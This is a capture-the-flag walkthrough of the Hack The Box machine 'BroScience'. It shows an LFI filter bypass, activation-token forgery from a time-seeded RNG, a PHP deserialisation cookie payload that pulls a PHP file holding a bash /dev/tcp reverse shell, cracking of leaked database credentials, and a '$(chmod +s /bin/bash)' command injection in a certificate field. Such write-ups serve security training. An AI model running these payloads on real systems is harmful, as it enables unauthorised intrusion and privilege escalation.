# BroScience

## Gaining Access

Nmap scan:

```bash
$ nmap -p- --min-rate 3000 10.129.127.134
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 22:54 EST
Nmap scan report for 10.129.127.134
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We have two HTTP ports, and we would have to add `broscience.htb` to our `/etc/hosts` file in order to access them. Visiting port 80 redirects us to the HTTPS site.

Vhost and directory scans don't reveal much regarding this.

### BroScience Enumeration

<figure><img src="../../../.gitbook/assets/image (1794).png" alt=""><figcaption></figcaption></figure>

We can take note that there is an `administrator` user present on the website, as they have made posts. Also, there's a login feature for this website. We are redirected to `login.php` when we click on Log In.

Within each post, there's an Add Comment functionality that requires us to be logged in. I attempted to register an account, but this didn't work because we had to find an activation link.

<figure><img src="../../../.gitbook/assets/image (2973).png" alt=""><figcaption></figcaption></figure>

So there's an activation link of some sort. I ran a directory scan for .php files on the website, and found quite a few.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u https://broscience.htb -t 100 -x php -k
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/10 23:09:04 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1936]
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 9308]
/register.php         (Status: 200) [Size: 2161]
/user.php             (Status: 200) [Size: 1309]
/comment.php          (Status: 302) [Size: 13] [--> /login.php]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
/activate.php         (Status: 200) [Size: 1256]
```

`activate.php` requires a `code` variable to be input. Perhaps this is the place we go to activate our registered accounts.

### LFI in img.php

When heading to the `/includes` directory, we can find some other PHP files that could contain credentials.

<figure><img src="../../../.gitbook/assets/image (3703).png" alt=""><figcaption></figcaption></figure>

Out of all of them, `img.php` requires a `path` parameter to be passed to it. It also detects LFI

```bash
$ curl -k https://broscience.htb/includes/img.php
<b>Error:</b> Missing 'path' parameter. 
$ curl -k https://broscience.htb/includes/img.php?path=/etc/passwd
<b>Error:</b> Attack detected.
```

We can attempt to read the db\_connect.php file somehow. I attempted to double URL encode the `path` value, and it worked!

```bash
$ curl -k https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

From here, we can see that is a `postgres` and `bill` user on the machine. Now, I wanted to read the files located within the machine to find some useful files within the `/includes` directory.

I was able to read the `db_connect.php` file by double URL encoding `../includes/db_connect.php` and passing it as the parameter.

<figure><img src="../../../.gitbook/assets/image (1140).png" alt=""><figcaption></figcaption></figure>

Trying this credential found does not work anywhere though. So I read the other files, and the `utils.php` file contained some useful information about how the activation code was generated.

### Activation Code Spoofing

This is the function for the activation code.

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

We can see that this uses `srand(time())` to generate the code. I found a few sources saying how this was a bad seed for a token as it can be predictable.

{% embed url="https://stackoverflow.com/questions/30145715/why-srandtime-is-a-bad-seed" %}

Perhaps we had to spoof the token somehow via brute force. We can also check `activate.php`, which we found earlier.

```php
if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';

        $res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
        $res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

        if (pg_num_rows($res) == 1) {
            // Check if account already activated
            $row = pg_fetch_row($res);
            if (!(bool)$row[1]) {
                // Activate account
                $res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
                $res = pg_execute($db_conn, "activate_account_query", array($row[0]));
                
                $alert = "Account activated!";
                $alert_type = "success";
            } else {
                $alert = 'Account already activated.';
            }
        } else {
            $alert = "Invalid activation code.";
        }
    } else {
        $alert = "Invalid activation code.";
    }
} else {
    $alert = "Missing activation code.";
}
```

There is an account query being made, and regex is used to detect the presence of a 32-character long code. For this, we can simply use the fact that when we register an account, there is a specific time on the system being used at that moment to generate our activation token in the database.

This is the HTTP response when we submit a new register request:

```http
HTTP/1.1 200 OK
Date: Wed, 11 Jan 2023 04:26:56 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2409
Connection: close
Content-Type: text/html; charset=UTF-8
```

Notice that there's a specific time specified by the machine. Perhaps we can just use this time to generate our activation cookie and then head to `activate.php` which asks for a `code` parameter. So, we can first copy the code used to generate the `activation_code` parameter.

Then, we can change the usage of `time()` to `strtotime('Wed, 11 Jan 2023 04:41:37 GMT')`, which is the time I registered a new account. The end script and output looks like this:

```php
<?php
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

srand(strtotime('Wed, 11 Jan 2023 04:41:37 GMT'));
//echo time();
echo "\n";
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
    $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
}
echo $activation_code;


$ php code.php       
vmsQdLZ9v5aUqAiUalTmt5CYnIxqrvpF
```

Afterwards, we use this `token` variable at `activate.php`.

<figure><img src="../../../.gitbook/assets/image (1142).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can just login as the user.&#x20;

### PHP Deserialisation

When reading the `utils.php` code some more, I found a few interesting bits. First is a hint to use deserialisation to exploit the machine, and a class called `Avatar` to exploit it with.

{% code title="utils.php" %}
```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

# Avatar Class elsewhere with f
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```
{% endcode %}

The function is called via the `swap_theme.php` file. (use LFI to read)

{% code title="swap_theme.php" %}
```php
// Swap the theme
include_once "includes/utils.php";
if (strcmp(get_theme(), "light") === 0) {
    set_theme("dark");
} else {
    set_theme("light");
}
```
{% endcode %}

Here's a good article to read on exploiting PHP deserialisation:

{% embed url="https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html" %}

Now, within the `Avatar` class, we can see a `__construct` function being used, which is invoked when an object is created. The class also takes in `tmp` file and writes it out on the machine.&#x20;

So the exploit path is simple:

* Create a new object via injection
* Have the machine use `fopen` to read a file (via HTTP) and write it to the machine. This file would be a reverse shell.
* `curl` the file and gain a reverse shell.

Here's a reverse shell that can work:

```php
<?php
  system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'");
?>
```

Then, we need to generate a cookie using specific values from the classes. A simple script with pre-defined variables to serialise and create our cookie suffices.

{% code title="evil.php" %}
```php
<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.4/rev.php";
    public $imgPath = "./rev.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
$serialized = base64_encode(serialize(new AvatarInterface))
echo $serialized
?>

$ php evil.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNToiaHR0cDovLzEwLjEwLjE0LjQvcmV2LnBocCI7czo3OiJpbWdQYXRoIjtzOjk6Ii4vcmV2LnBocCI7fQ==
```
{% endcode %}

Then, we can simply send a request with this the output as the cookie. We would get a few hits on our HTTP server.

<figure><img src="../../../.gitbook/assets/image (3537).png" alt=""><figcaption></figcaption></figure>

Then we can simply curl it to gain a reverse shell.

<figure><img src="../../../.gitbook/assets/image (2122).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PostgreSQL Creds

Earlier, we found a `db_connect.php` file that contained some credentials. We can attempt to access the PostgreSQL instance listening on port 5432 on the machine.

```bash
www-data@broscience: /var/www/html$ psql -h localhost -d broscience -U dbuser -W
# Password is RangeOfMotion%777
```

We can use `\d` to read the tables present on the machine.

```
 Schema |       Name       |   Type   |  Owner   
--------+------------------+----------+----------
 public | comments         | table    | postgres
 public | comments_id_seq  | sequence | postgres
 public | exercises        | table    | postgres
 public | exercises_id_seq | sequence | postgres
 public | users            | table    | postgres
 public | users_id_seq     | sequence | postgres
```

Then, we can read the stuff in the `users` file.&#x20;

<figure><img src="../../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>

We would find lots of hashes. Since the user on the machine is `bill`, let's attempt to crack his hash. The `db_connect.php` file did have a salt for the hashes as "NaCl". Using this, we can generate a wordlist based on rockyou.txt with this salt prepended to all the words.

```bash
cp /usr/share/wordlists/rockyou.txt .
sed -i 's|^|NaCl|g' rockyou.txt
```

Then, we can use `hashcat` to crack the hash.

<figure><img src="../../../.gitbook/assets/image (3419).png" alt=""><figcaption></figcaption></figure>

The part without the salt is the password that we can use to SSH in as `bill`.

### Renew\_cert.sh

Within the `/opt` directory, there's a `renew_cert.sh` file.

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
fi
```

This could potentially be a cronjob that is running, so I downloaded and ran `pspy64` to make sure. We would see the root user running this:

```bash
/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```

Very obviously, the `commonName` parameter is where we would store our payload to become root. We can use `openssl` to generate a quick cert to exploit this and create an SUID bash binary. We can leave all the other parameters blank except for the Common Name.&#x20;

```
bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt
Generating a RSA private key
.....................................................................................++++
....................++++
writing new private key to 'broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod +s /bin/bash)
Email Address []:
```

After a while, it would execute and allow us to spawn in a root shell.

<figure><img src="../../../.gitbook/assets/image (3440).png" alt=""><figcaption></figcaption></figure>
